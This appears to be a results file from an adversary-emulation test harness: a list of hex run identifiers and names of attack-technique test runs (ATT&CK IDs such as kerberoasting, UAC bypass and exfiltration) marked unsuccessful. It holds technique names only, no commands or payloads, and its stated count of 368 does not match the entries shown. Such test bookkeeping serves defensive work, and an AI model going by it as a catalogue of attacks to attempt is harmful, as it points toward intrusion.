f71199dcf1e307fc37c5a0cb9e4031b9
6d968b2bfa7f45550662620724618fb9
cea891e7c3c3efe3723eca495d261472
6722535bf5a14b87b5772b739f53321f
0fccd1bb314f0b3cbffd27c2123ae955
9ac97b0e88af420a8c767a7512985895
52928f462ea8f5fa617aa8c815f5598b
9eb61c26282c5b324e1fb6cceeefc445
1033c974479429c54dff4470e614113d
5ce7136a4547b0bf3ca074c94fb10b24
21363f92027047ce1dbfdd47f7a483b5
64ccf7cd4358a0540ab51c8015c1b744
8ed60dceb98746f1da6214f4f6af7164
13a0c78dbd8d3645db69540bfe7cd038
1c1381522818218092a12b973593f3a9
80cda763aa992b775038ce134c892070
45aa13ed61bbe98aaf9324ce8044c860
29d32b9096933705ce0fffc441283b20
b8e136dad1af7b29939e86be6d7ecefa
8b5f748da9647a4d9c5a37f20124ba9c
582871bcbf9a88caed89ae25d76d018c
b66a6eed7d46ab2ca4c3bf1ae3b61f44
6b8a391237b7169d02dd6538f8290345
e8c24e75714483eb3b526fc589a88f9a
84a93e5157b690ee0f585cd55c15b0cb
ff659febed01ef020792aa5f83d08d6d
566388d2f3073aced1a2c86b3a65826c
d2e0c0165046372fcd5e2bf910eeb477
1f2da2639fcd636ef1c7ead72de4469f
163fd8a878476002c604d0fe4e32a419
16e96b0f0c0021663b2f5dfafabee6f0
725f6e03f3e2098c4303861566f18894
1cca72410c2849070d833700fcc30c59
954860df5054a5fabc114abefd8e45f6
25b475e94dd2d70fcc66b2ce43c8f718
ae73a53476995f46b71f11709f525319
53187e13ccee0b0d71451ca3fdc1f9d9
20d68348c822d2947e5a795ac15a22b0
e538e0ff74962aaf1dbd08baa5c7853f
114ad8aad10ca59e6a10b655764d749a
78931aaa8e328d30a3e47f61e2899b3b
d0966749d457cb6218a8cd5ee5128ea2
fdc26580786ac9d3ffc38aea053cbd29
a9df2530a06e1aa7d1ba9e9309364b9f
90c76bd616efee6d7c98dc6c1dcc6e99
89a4fca013d3d39fc4effb1f6c8a8d74
f39aace719f4cdcf8569001f7a25aabf
fef50b36806647cb5a5511ae48f7e56f
0ecc3d4729cf37c719528291d63f9f99
0bb6fa90a458e6512a19d246cfae8843
f50ec080343f1bec4e739dd20675c349
7cd26e24cc23c5a7e1183120fa034f89
396dae93ab07f7c93853def404fefebf
1d48fc4147a7bcd47bdf60db7dde9640
95f9e48ea1fbdac2f1c7c656b655ae4c
f32d25602b6c142d321b9a0965316916
7f43a2b144f2534eb979d2b6638e0283
196263c4c1f42138866d958193ad2ad4
51ef5578afcd873709d2c7672234e57b
51ddafefb92c9dfcb6ce3369e7316bf3
36a790779a43eb407e4852726be0c66e
495536c73651969fd80a8f263c293194
f5b48f9f8e01db3edd487c05580a0e90
3ed2af2ffd2e21a9b97fbfb732ef3971
2ca71106ee0aff2eda551bb6ed2b39e4
f22a27383f804337af8e690aae594d97
009e7a7118b5a182b2a5b65150e5cc6f
824ec334619ca634d13aff308a9a064c
f5b4c02bae169cb3a62ac26bb80321d6
6fa417fb183d6c20a67e617c0249f04f
3d628a543cd195d2a19b89b76a8e5d74
248be98ef985ef5053a26ed7cd929c14
029770bd7c3a403daeab3af692af0046
ae1510936a20ac31014eb86e5b4944ce
01a2ad691dfb47b11d050fab371718d2
b939c81cba750f4b3ef67e6b0456b41e
45f462c09f28d5b0819af7b1ed0913e1
1353d954c020fa5ff039b7e85ee261bc
23daed0787180c7f2ffbc20528570749
d21a964d09837abede8966daf6ae46cf
4df316c222125fe7372723c5b3434977
2ed8948f1c1156af47d50379e7965d90
9d0478981edda6091f911a1305025bde
a59dbd1a2ac17d69455248e7d91231bc
a967003ff25bdd94030cdd885feb25d7
c29f0da7c0bf612d30acb64e1d6e9368
0a96ef5851da1be487cebdd9a1f86b7a
b74b60096fb49650e27e470047a2b9c9
6d3a92f7fc3d8abeea37531cfba7c79e
6baab84fe7a52dd5c4ede612fc0d255f
10a0f4f8efdae71f3e88b3e20560798a
fd4ca8f12c6d3a9af55be0211878509b
a935a79ba61ecb00458208b0bd5ef15e
f5cef6032e9bace6a1938456ac5a5cfb
f071213a29669283eeb8ab07ddffdbfb
1ce0e92b4cd09129c6d0f3aafb38c600
6940ffd670787cd1c410997e66629573
2cda9de49fe7ac16813a23d0741e9b28
4c378a952a9235b7aba7f273f3cf4874
7030b003cc5646c7cc83410d2f057575
38714562d32f33dc32bd7aef553771d9
279d24eeb12b40e4547945accf59ca62
5458332f329c896a133982a7df20d358
54b98f924ee4613c7d927a3ea1dd260a
d7f1270ba66d5947a1422f7d5b1a36ef
e0e717c540d5e8ff24f00b7434626f7e
d9c1b1283c1ad6fdda27be021c4737d3
3b4fb2e38c41453a6b2b0f2fecdd84ff
68ce066d07960123ccd981dd8c38a7c1
623806a6fd4d832b6692eb275535f636
35200ef3d7ca094ae2208a1df03ede18
aeb4fdbb3453127caaef0ad5c250d838
bc34d6834bdf568e206627f7809a556f
c6ea575d9641c11410417105f14175ab
73fed1f32224461748c3630217b7d300
86993ae14d75a6da421c0d98c3facd61
885997e230cb2b9dc3cc7e9d8ec5a6d8
ed172018f897dab90147a47995ce197d
5fd6b6b635191898a202dc7c21aa6068
015d186adee85e65d7255b383e1a039f
f91d7dfb1e6fd4fa742f24927ca4af26
ffe23675b3b68eb6d2b6e771451de3af
d2f6cb279552f1b65a9805d63eed1689
69b202bf0bb7b4ff43d4abb8867c1784
b5fe84fa9fb8216512867a039a61db20
53571e9988b92014f9d71888936d3878
fff25debffb3645d82c89632750497a1
aaeee9107989a507f526b0cef1cb274f
560688901ad2b8f465e98c52379ae834
50df8303a555242bea67342db40d0d47
986876c6024765475043100f9e080fc8
1827aa5862b0a63ce537ed37636933d5
54ef63765cf80243f370958bcf738338
608b7021a5b8369e9fd858feba6f5611
65e9fb2b4c023de2a2a73de5cc58ce7f
4b325a29e936cd1ccac2292bc92a31b5
7a87eec9166dd9d24825a4af7bb3bc47
8c0f619c7dfd33907bf20b1dfb58022b
8beb34c915b17873e357c030d517be0a
995eb25ee0b9d036110318311ca2527b
f5606cc7632289d5ca72d4a485c14f6b
e6a9fe7e91030f05ad87b75ad4fd4a3a
e922717a38fc8806bc9b56b111b999ff
91a18ae1efe4119a549cea2ac7de72c4
f2d48f9efed23e058bfe0f46d93d07a2
5d4905a2f789ff40c53b1ea8ee53df3d
03a80d4a4c02d99295b5901ee695cc79
83a5ad479c9e313e60f34380e193102a
8aabc61664e947c69058c3df4f3af860
3aae7c6d210ffb084186f1686a1f00c1
2f03250355bb1403dcfac6808782a192
aee64e494f7adfb1867d67f7ee08e5c6
4712f45e41760276d20885bbc885a2ef
c1392878b0e39a2060e7e1b70e5a580b
413fc5fa7ac34f8a42183217d7f3ec90
286916316d725933021d57fb5620d644
afae914d4839d5194835d8475604e7b8
941eb886a05444e588fd6c17d992df98
e9e69b4fedb8e40d634865ce9a3192dc
e5279c9ad109fef655e2c1abd6304725
106045f14741390cfb3fe95300585fb6
53d41aa7edbb10cea4c99df8c2b0862f
77e4fd90d211edf046c6c7092a4ed3af
2f4c11504a21b8771b725a3e469fd74b
44c554d9bf01759c8a35c8ec8eb8510d
6bbb6f8b1db42e2c2c79892e8c31feb3
2db3b2385ba856424bfe130f69fc0529
3b631d04243ac011df9f91cd07025180
981cf81e3bb0649fafc31217c8cbc00d
9995c62a6263a14ae3b60fe2bb52e67a
31a7326fcc56c71d97da23e3fe1ec364
c84a57391dbc724dc51436deb3e0ca00
8862278ba483c0d5f719ffbc9186a901
b97004a5d9c4283b6085ddf3ff0d6b4c
7a6e495200cd37c66f02e7bc070b61a9
58351281e64f2182ac4f8b44f63e9042
3d7b7a1676afefc4af9506003b2d58d1
61e9071d7b1f01969893d015526e1099
fca2ce47cdb3acfde35139ca9017af80
f6d9c3fbee5549837ea37ff933291656
7a0717485ca13c441d26bfaaa5c92535
bc5d26cf7201f1504b495ca2c1758ebf
000549902a51ef21f57d3d28a6e5ecc0
f6867f2b9b1b3c2eb733ad7ce7438f04
03a127453d425bf1fd8dc9af1ed7ddce
748882eaad1b31e8f90d9b31692200fe
2c6e39a39ebf794d74417a7b1291463b
6e214f0f17e5d4988aa1085ad4291f46
c0177717b47f2cd07949186523fa3c6b
f21623deb932dc0db3f00068ba15bf32
1272c02ca685d9967ee2be885dea8df5
7f734143338de2b02093a703f919e7fc
9e1358e1b78af4bf86bab2334485a015
efdca41c8a098f89f2db9c334627d8ac
e93d024cd93ceaaf880d6f799ef1c9c8
bba7fe7940f8719efa3c38e54ec79e2c
3f73be176cadf2762623b3117e25335d
f1dcadde207fafe338ae3eb48805f23c
1bb96a80fd7968839ead470953ffb738
7440c68b83b6d728b4111d083facefec
55fa0d4a61d03d34c0628b6b5343cac7
36aa805044ab4f4d7f6f372a46c8bab2
4bdc05fe2f0006f86575053dc740edf3
2d78dfbfea7fa4ec7349993b83048079
a8a3487e477e0c1501ceb0239b5cad15
681fd384d66be9e180a74e5fecdc4ab6
f5dd56d901db9f95668988426326bc3a
5e744dc6fc70da028ccd50f7e73ee0be
e958169f1efe85a5a5ea7a77eba8c29e
c087fa2d3870144b9fd442f476e7768a
8bdb353bbee5378745783ff6f2d49cb0
b7f89af9214876eae185527350ca034f
8c4228fa7e1c015590d1f13d935e5bb8
aa40e8fe704a97fb7f7a5a02e9334824
a72efdca009d9d28e444240e691a4769
5ee8fce78c4cef28c4e6ecebe77bdba4
c275ffb52331397b42ebc52338be3c8c
35b68f98acbdbdde166d4154462d2467
e5168b0f7e57ba7b20c9842a350bb539
9d03b18c922b94ebba44d25c430e6e95
679ef375ad2b361965500392419d084c
4de0ba1566249a72e81e74707cc91a00
3c9dee6c65974cc3b4f34d0a5d1b6992
9381d0e0efbf5bf89a9e512f8b3745f4
c285cfeaf0c226d3d2b3812726dbe3a8
d1bde9af5206152c9980a5b6adcc1813
337c07ce279b747827679ffb226e5d9c
56c2f2d8b48bcb1c999d4e8929bd8d9b
cfcf66cc85109ad2ebdb301d619fa41f
01f95fd0213aeb1eb07fca8dc548f5ce
2cdcf1010a524231a26b5f3c6025eb91
f27b37f253617c39ac010d2ee1238b7e
b26ce33f4cd29428f619fc600e052350
50a9be8bbff4d4ffe0b699cb8d040c6d
ac7757ba58f423fa808b4b6f115cc613
3c8ae3452b200f3509b14463df78068c
107a14acdd84a7d6e7c891177b0db3aa
04d33ddae0126966ae6d841267c17329
4df4fdb269f34dd6d55969c83ff06c73
7532005da662bfc703ce3d8ef4e8ac70
0402c74f97e712d03605175c5ba9675b
4abdd4cce7c4aa8a3804a6f5ff365514
2d2b2b31b70f1beef285b942c580f4c3
cc5347b500dfbdbb96b1fdb6a0669708
5a33c31395b6ef3ee38097b327c8b79d
beafe61e6874eb9eec2119bd12255193
ef2c951840423ba90c208867dcf89c87
627f499ceb32e74b95494141bc680e08
abeb340acb3e1236c6919339942e7c77
bda00f459bb9118c4c88de426055e180
9ef143154774a6d0d74e0828e90290ac
e643e21318c069d0a576da91650c76fe
42102f01777d40a7db982282c4c791e9
b00d08275bb2b3ef620e103b1fd7b9e4
e2e6f33cf77d10e3c82c244014da20c5
a515bb54fd6e14b78297814875f3c73b
488ec76af9bd3c5d9feb1d660504b541
c58ba91431b9d73d726ccdd7d030a694
ba763ea19604a73e3e1f9d9d8d86d9cc
5b0527d3382ac91860501cccc9595348
608e19b5f7e210ba73e207289e5a1314
abc280f400f218aa1f4d5efe3c9e8228
eedc7881da4d2fddb5c56fb96aaeecfd
b7e7e9eb804006a78cdd75940f7b7c3e
-------------------------
Unsuccessful techiniques Adversary-Ids (368)


atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__1bb96a80fd7968839ead470953ffb738__trial_1
atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__d2e0c0165046372fcd5e2bf910eeb477__trial_1
atomic__t1110_003__credential-access__brute_force-_password_spraying__a59dbd1a2ac17d69455248e7d91231bc__trial_1
atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__d0966749d457cb6218a8cd5ee5128ea2__trial_1
atomic__t1095__command-and-control__non-application_layer_protocol__9ed218029d8392d2b4fdedd0f44bb052__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__a45769d74eb1c75ff916b121023bde31__trial_1
atomic__t1574_008__multiple__hijack_execution_flow-_path_interception_by_search_order_hijacking__e538e0ff74962aaf1dbd08baa5c7853f__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__cb6e6c7e18aba2207c696368f8edb23a__trial_1
atomic__t1518__discovery__software_discovery__beafe61e6874eb9eec2119bd12255193__trial_1
atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__4c378a952a9235b7aba7f273f3cf4874__trial_1
atomic__t1204_002__execution__user_execution-_malicious_file__03a80d4a4c02d99295b5901ee695cc79__trial_1
atomic__t1074_001__collection__data_staged-_local_data_staging__885997e230cb2b9dc3cc7e9d8ec5a6d8__trial_1
atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__aa40e8fe704a97fb7f7a5a02e9334824__trial_1
atomic__t1021_006__lateral-movement__remote_services-_windows_remote_management__dce08779676c01d98885e164a1176ac8__trial_1
atomic__t1046__discovery__network_service_discovery__bc34d6834bdf568e206627f7809a556f__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__9eb61c26282c5b324e1fb6cceeefc445__trial_1
atomic__t1219__command-and-control__remote_access_software__f50ec080343f1bec4e739dd20675c349__trial_1
atomic__t1027__defense-evasion__obfuscated_files_or_information__b62952c5352ee68c1340feb08a5a02a1__trial_1
atomic__t1518_001__discovery__software_discovery-_security_software_discovery__e922717a38fc8806bc9b56b111b999ff__trial_1
atomic__t1069_001__discovery__permission_groups_discovery-_local_groups__e541c2b62c3259680863a6f3b410e59a__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__48a861eb5802bd7abdaa64b4fcd30924__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__fff25debffb3645d82c89632750497a1__trial_1
atomic__t1135__discovery__network_share_discovery__d7f1270ba66d5947a1422f7d5b1a36ef__trial_1
atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__58351281e64f2182ac4f8b44f63e9042__trial_1
atomic__t1018__discovery__remote_system_discovery__13a0c78dbd8d3645db69540bfe7cd038__trial_1
atomic__t1564_004__defense-evasion__hide_artifacts-_ntfs_file_attributes__1532b3faf25ad1e6f4fba4ada643b253__trial_1
atomic__t1572__command-and-control__protocol_tunneling__6e214f0f17e5d4988aa1085ad4291f46__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__e2e6f33cf77d10e3c82c244014da20c5__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__f5606cc7632289d5ca72d4a485c14f6b__trial_1
atomic__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__52928f462ea8f5fa617aa8c815f5598b__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__6bbb6f8b1db42e2c2c79892e8c31feb3__trial_1
atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__ae1510936a20ac31014eb86e5b4944ce__trial_1
atomic__t1027__defense-evasion__obfuscated_files_or_information__1827aa5862b0a63ce537ed37636933d5__trial_1
atomic__t1078_003__multiple__valid_accounts-_local_accounts__5ce7136a4547b0bf3ca074c94fb10b24__trial_1
atomic__t1071_004__command-and-control__application_layer_protocol-_dns__bda00f459bb9118c4c88de426055e180__trial_1
atomic__t1486__impact__data_encrypted_for_impact__f22a27383f804337af8e690aae594d97__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__a9df2530a06e1aa7d1ba9e9309364b9f__trial_1
atomic__t1046__discovery__network_service_discovery__9381d0e0efbf5bf89a9e512f8b3745f4__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__0ecc3d4729cf37c719528291d63f9f99__trial_1
atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__8b5f748da9647a4d9c5a37f20124ba9c__trial_1
atomic__t1550_003__multiple__use_alternate_authentication_material-_pass_the_ticket__566388d2f3073aced1a2c86b3a65826c__trial_1
atomic__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__1f2da2639fcd636ef1c7ead72de4469f__trial_1
atomic__t1082__discovery__system_information_discovery__b7e7e9eb804006a78cdd75940f7b7c3e__trial_1
atomic__t1071_004__command-and-control__application_layer_protocol-_dns__ce2eccff2f1de0096efa0da778a7e27c__trial_1
atomic__t1490__impact__inhibit_system_recovery__409acf7907007b041753a5f452b3df9b__trial_1
atomic__t1018__discovery__remote_system_discovery__587a8743222626915bb08b3e9e132b19__trial_1
atomic__t1505_002__persistence__server_software_component-_transport_agent__b00d08275bb2b3ef620e103b1fd7b9e4__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__fef50b36806647cb5a5511ae48f7e56f__trial_1
atomic__t1219__command-and-control__remote_access_software__1ce0e92b4cd09129c6d0f3aafb38c600__trial_1
atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__a72efdca009d9d28e444240e691a4769__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f91d7dfb1e6fd4fa742f24927ca4af26__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__d5bb3cda05ddba230c90c1afb2640379__trial_1
atomic__t1021_002__lateral-movement__remote_services-_smb,windows_admin_shares__31a7326fcc56c71d97da23e3fe1ec364__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__afae914d4839d5194835d8475604e7b8__trial_1
atomic__t1201__discovery__password_policy_discovery__8c4228fa7e1c015590d1f13d935e5bb8__trial_1
atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3b631d04243ac011df9f91cd07025180__trial_1
atomic__t1041__exfiltration__exfiltration_over_c2_channel__72784d12700b219ec134aa42cec5603e__trial_1
atomic__t1558_002__credential-access__steal_or_forge_kerberos_tickets-_silver_ticket__8bdb353bbee5378745783ff6f2d49cb0__trial_1
atomic__t1546_009__multiple__event_triggered_execution-_appcert_dlls__5d4905a2f789ff40c53b1ea8ee53df3d__trial_1
atomic__t1219__command-and-control__remote_access_software__d21a964d09837abede8966daf6ae46cf__trial_1
atomic__t1135__discovery__network_share_discovery__4b325a29e936cd1ccac2292bc92a31b5__trial_1
atomic__t1574_011__multiple__hijack_execution_flow-_services_registry_permissions_weakness__6d3a92f7fc3d8abeea37531cfba7c79e__trial_1
atomic__t1046__discovery__network_service_discovery__114ad8aad10ca59e6a10b655764d749a__trial_1
atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__7440c68b83b6d728b4111d083facefec__trial_1
atomic__t1027__defense-evasion__obfuscated_files_or_information__fd4ca8f12c6d3a9af55be0211878509b__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__10a0f4f8efdae71f3e88b3e20560798a__trial_1
atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__2f03250355bb1403dcfac6808782a192__trial_1
atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__29d32b9096933705ce0fffc441283b20__trial_1
atomic__t1098__persistence__account_manipulation__53187e13ccee0b0d71451ca3fdc1f9d9__trial_1
atomic__t1090_003__command-and-control__proxy-_multi-hop_proxy__2f4c11504a21b8771b725a3e469fd74b__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c087fa2d3870144b9fd442f476e7768a__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__aee64e494f7adfb1867d67f7ee08e5c6__trial_1
atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__bf9cc3d98c38f79c948a0f4a7f888034__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__196263c4c1f42138866d958193ad2ad4__trial_1
atomic__t1046__discovery__network_service_discovery__45aa13ed61bbe98aaf9324ce8044c860__trial_1
atomic__t1055__multiple__process_injection__4abdd4cce7c4aa8a3804a6f5ff365514__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c0bc49e3838d26569b243ae283082926__trial_1
atomic__t1083__discovery__file_and_directory_discovery__1033c974479429c54dff4470e614113d__trial_1
atomic__t1082__discovery__system_information_discovery__b8e136dad1af7b29939e86be6d7ecefa__trial_1
atomic__t1187__credential-access__forced_authentication__6b8a391237b7169d02dd6538f8290345__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__55fa0d4a61d03d34c0628b6b5343cac7__trial_1
atomic__t1571__command-and-control__non-standard_port__7f734143338de2b02093a703f919e7fc__trial_1
atomic__t1082__discovery__system_information_discovery__c58ba91431b9d73d726ccdd7d030a694__trial_1
atomic__t1218__defense-evasion__signed_binary_proxy_execution__51ef5578afcd873709d2c7672234e57b__trial_1
atomic__t1098__persistence__account_manipulation__8aabc61664e947c69058c3df4f3af860__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__ba763ea19604a73e3e1f9d9d8d86d9cc__trial_1
atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__9b3194cc656092b09f4d79ba3d3a3277__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__e5279c9ad109fef655e2c1abd6304725__trial_1
atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__5e744dc6fc70da028ccd50f7e73ee0be__trial_1
atomic__t1547_012__multiple__boot_or_logon_autostart_execution-_print_processors__b2725f4e411b9328aa73fe54501a7564__trial_1
atomic__t1071_001__command-and-control__application_layer_protocol-_web_protocols__ef2c951840423ba90c208867dcf89c87__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b97004a5d9c4283b6085ddf3ff0d6b4c__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__abeb340acb3e1236c6919339942e7c77__trial_1
atomic__t1082__discovery__system_information_discovery__286916316d725933021d57fb5620d644__trial_1
atomic__t1201__discovery__password_policy_discovery__214be4092770061080ef0781c26bab3e__trial_1
atomic__t1098__persistence__account_manipulation__015d186adee85e65d7255b383e1a039f__trial_1
atomic__t1485__impact__data_destruction__b74b60096fb49650e27e470047a2b9c9__trial_1
atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__2db3b2385ba856424bfe130f69fc0529__trial_1
atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__4df316c222125fe7372723c5b3434977__trial_1
atomic__t1558_001__credential-access__steal_or_forge_kerberos_tickets-_golden_ticket__6d0695f8f33776c82ad1294b6c6f02cd__trial_1
atomic__t1098__persistence__account_manipulation__8862278ba483c0d5f719ffbc9186a901__trial_1
atomic__t1546__multiple__event_triggered_execution__6fb0cdea444d58a340896d606baf281a__trial_1
atomic__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__2cdcf1010a524231a26b5f3c6025eb91__trial_1
atomic__t1547_015__multiple__boot_or_logon_autostart_execution-_login_items__01a2ad691dfb47b11d050fab371718d2__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__42102f01777d40a7db982282c4c791e9__trial_1
atomic__t1572__command-and-control__protocol_tunneling__45f462c09f28d5b0819af7b1ed0913e1__trial_1
atomic__t1218_009__defense-evasion__signed_binary_proxy_execution-_regsvcs,regasm__78931aaa8e328d30a3e47f61e2899b3b__trial_1
atomic__t1134_002__multiple__create_process_with_token__163fd8a878476002c604d0fe4e32a419__trial_1
atomic__t1505_004__persistence__iis_components__e8c24e75714483eb3b526fc589a88f9a__trial_1
atomic__t1021_001__lateral-movement__remote_services-_remote_desktop_protocol__aabe23a58568de3f9cc40e42e5f1b223__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__4bf4facd1dad540d4b17ebe0db235707__trial_1
atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__5e3512c73a461c17ddcb1cc0bbdbeef9__trial_1
atomic__t1570__lateral-movement__lateral_tool_transfer__4de0ba1566249a72e81e74707cc91a00__trial_1
atomic__t1039__collection__data_from_network_shared_drive__73fed1f32224461748c3630217b7d300__trial_1
atomic__t1135__discovery__network_share_discovery__25b475e94dd2d70fcc66b2ce43c8f718__trial_1
atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__79cb459770a15ea9e56b874d62bf8319__trial_1
atomic__t1555__credential-access__credentials_from_password_stores__f6867f2b9b1b3c2eb733ad7ce7438f04__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__679ef375ad2b361965500392419d084c__trial_1
atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__d3e69d970c19fb2a9a2ee8be47ea17ad__trial_1
atomic__t1018__discovery__remote_system_discovery__681fd384d66be9e180a74e5fecdc4ab6__trial_1
atomic__t1219__command-and-control__remote_access_software__9e1358e1b78af4bf86bab2334485a015__trial_1
atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__3f73be176cadf2762623b3117e25335d__trial_1
atomic__t1546_012__multiple__event_triggered_execution-_image_file_execution_options_injection__7f43a2b144f2534eb979d2b6638e0283__trial_1
atomic__t1539__credential-access__steal_web_session_cookie__126aaf80c6a232eaf08dcef3163d4aed__trial_1
atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__9c2f9c808a72b05686236a63e1da93c8__trial_1
atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__eedc7881da4d2fddb5c56fb96aaeecfd__trial_1
atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__84a93e5157b690ee0f585cd55c15b0cb__trial_1
atomic__t1518__discovery__software_discovery__0954576f69ca8e140f2cdc9e58b36ff9__trial_1
atomic__t1098__persistence__account_manipulation__0690e0818b5749092595a472831f362f__trial_1
atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__3c9dee6c65974cc3b4f34d0a5d1b6992__trial_1
atomic__t1543_003__multiple__create_or_modify_system_process-_windows_service__7030b003cc5646c7cc83410d2f057575__trial_1
atomic__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__f5cef6032e9bace6a1938456ac5a5cfb__trial_1
atomic__t1567_003__exfiltration__exfiltration_over_web_service-_exfiltration_to_text_storage_sites__c275ffb52331397b42ebc52338be3c8c__trial_1
atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__54b98f924ee4613c7d927a3ea1dd260a__trial_1
atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__560688901ad2b8f465e98c52379ae834__trial_1
atomic__t1219__command-and-control__remote_access_software__9332aff267b00ede37b09606340ee1dc__trial_1
atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__36aa805044ab4f4d7f6f372a46c8bab2__trial_1
atomic__t1082__discovery__system_information_discovery__488ec76af9bd3c5d9feb1d660504b541__trial_1
atomic__t1069_001__discovery__permission_groups_discovery-_local_groups__608e19b5f7e210ba73e207289e5a1314__trial_1
atomic__t1567_002__exfiltration__exfiltration_over_web_service-_exfiltration_to_cloud_storage__9995c62a6263a14ae3b60fe2bb52e67a__trial_1
atomic__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__9d21f3b551b40fa40056af1244af56ee__trial_1
atomic__t1106__execution__native_api__2ca71106ee0aff2eda551bb6ed2b39e4__trial_1
atomic__t1176__persistence__browser_extensions__70f8b4c0be2ee69f07592eee0aa5acc0__trial_1
atomic__t1134_002__multiple__create_process_with_token__fdc26580786ac9d3ffc38aea053cbd29__trial_1
atomic__t1082__discovery__system_information_discovery__a9faa0d792d6bc2660b05e7650d2736d__trial_1
atomic__t1562_002__defense-evasion__impair_defenses-_disable_windows_event_logging__47ba984c0c40a7c41b4797156c1a5f96__trial_1
atomic__t1087_002__discovery__account_discovery-_domain_account__c84a57391dbc724dc51436deb3e0ca00__trial_1
atomic__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__8beb34c915b17873e357c030d517be0a__trial_1
atomic__t1112__defense-evasion__modify_registry__d2f6cb279552f1b65a9805d63eed1689__trial_1
atomic__t1615__discovery__group_policy_discovery__834e861bba95b87d066e84c5c6b056a0__trial_1
atomic__t1482__discovery__domain_trust_discovery__53571e9988b92014f9d71888936d3878__trial_1
atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__9ac97b0e88af420a8c767a7512985895__trial_1
atomic__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__938a659c52ed102a8b35c7b1bb49eb11__trial_1
atomic__t1046__discovery__network_service_discovery__65e9fb2b4c023de2a2a73de5cc58ce7f__trial_1
atomic__t1069_001__discovery__permission_groups_discovery-_local_groups__f5b4c02bae169cb3a62ac26bb80321d6__trial_1
atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__bba7fe7940f8719efa3c38e54ec79e2c__trial_1
atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__6baab84fe7a52dd5c4ede612fc0d255f__trial_1
atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__44c554d9bf01759c8a35c8ec8eb8510d__trial_1
atomic__t1482__discovery__domain_trust_discovery__ff659febed01ef020792aa5f83d08d6d__trial_1
atomic__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__7f0f5471543a6f188b0fbdc436c49fd9__trial_1
atomic__t1550_002__multiple__use_alternate_authentication_material-_pass_the_hash__8ce073cf3170576e1f5c6e4d06e1873a__trial_1
